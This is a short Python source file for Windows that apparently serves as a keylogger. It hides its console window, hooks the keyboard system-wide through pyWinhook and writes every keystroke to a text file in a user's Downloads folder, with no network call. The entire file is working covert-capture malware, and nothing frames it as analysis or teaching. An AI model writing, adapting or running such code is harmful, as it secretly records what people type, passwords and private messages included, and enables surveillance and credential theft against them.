import pyWinhook
import pythoncom
import win32console
import win32gui

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)


def onkeyboardevent(event):
    if event.Ascii == 5:
        exit(1)
    if event.Ascii != 0 or 8:
        f = open('c:/Users/hp/Downloads/output.txt', 'r+')
        buffer = f.read()
        f.close()
        f = open('c:/Users/hp/Downloads/output.txt', 'w')
        keylogs = chr(event.Ascii)
        if event.Ascii == 13:
            keylogs = '\n'
        buffer += keylogs
        f.write(str(buffer))
        f.close()
    return 0


hm = pyWinhook.HookManager()
hm.KeyDown = onkeyboardevent
hm.HookKeyboard()
pythoncom.PumpMessages()